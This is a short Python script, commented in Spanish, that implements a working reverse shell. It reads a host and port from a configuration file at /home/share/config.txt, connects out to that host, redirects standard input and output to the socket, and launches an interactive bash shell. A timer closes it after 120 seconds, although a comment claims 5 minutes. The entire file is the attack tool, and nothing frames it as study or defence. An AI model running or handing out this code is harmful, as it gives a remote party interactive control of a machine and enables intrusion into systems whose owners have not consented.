import socket, subprocess, os, threading

def reverse_shell(ip, puerto):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, puerto))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    # Ejecuta la shell en un subprocess
    proceso_shell = subprocess.Popen(["/bin/bash", "-i"], close_fds=True)

    # Función para cerrar la conexión y terminar el proceso shell
    def cerrar_conexion():
        proceso_shell.terminate()  # Intenta terminar el proceso de la shell
        s.shutdown(socket.SHUT_RDWR)
        s.close()

    # Temporizador para cerrar la conexión después de 5 minutos
    timer = threading.Timer(120, cerrar_conexion)
    timer.start()

    proceso_shell.wait()  # Espera a que el proceso de la shell termine

# Ruta al archivo de configuración en /home/share
archivo_configuracion = '/home/share/config.txt'

def leer_ip_puerto(archivo_configuracion):
    try:
        with open(archivo_configuracion, 'r') as archivo:
            data = archivo.read().strip().split(':')
            if len(data) == 2:
                return data[0], int(data[1])
    except Exception as e:
        print(f"Error al leer el archivo de configuración: {e}")
    return None, None

ip, puerto = leer_ip_puerto(archivo_configuracion)

if ip and puerto:
    reverse_shell(ip, puerto)
else:
    print("No se pudo iniciar la reverse shell: IP o puerto inválidos.")
